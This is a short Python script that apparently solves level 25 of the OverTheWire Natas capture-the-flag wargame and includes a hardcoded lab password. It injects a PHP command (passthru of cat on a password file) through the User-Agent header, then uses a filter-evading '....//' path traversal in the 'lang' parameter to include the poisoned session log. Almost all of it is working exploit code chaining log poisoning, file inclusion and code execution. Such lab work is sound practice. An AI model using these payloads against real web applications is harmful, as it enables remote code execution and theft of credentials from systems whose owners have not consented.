import requests

target = 'http://natas25.natas.labs.overthewire.org/index.php'
user_auth = ('natas25','GHF6X7YwACaYYssHVY05cFq83hRktl4c')
user_header = {'User-agent':'<?php passthru(\'cat ../../../../etc/natas_webpass/natas26\')?>'}

#response = requests.get(target, auth = user_auth, 

session = requests.Session()
response = session.post(target, auth = user_auth, headers = user_header,
#    params={'lang':'....//....//....//....//....//etc/natas_webpass/natas26'})
    params={'lang':'....//language/de'})


print "-" * 100
#print response.text
sesh = session.cookies['PHPSESSID']
payload = '....//....//....//....//....//tmp/natas25_' + sesh + '.log' 

response2 = session.get(target, auth = user_auth,
    params={'lang':payload})

print response2.text
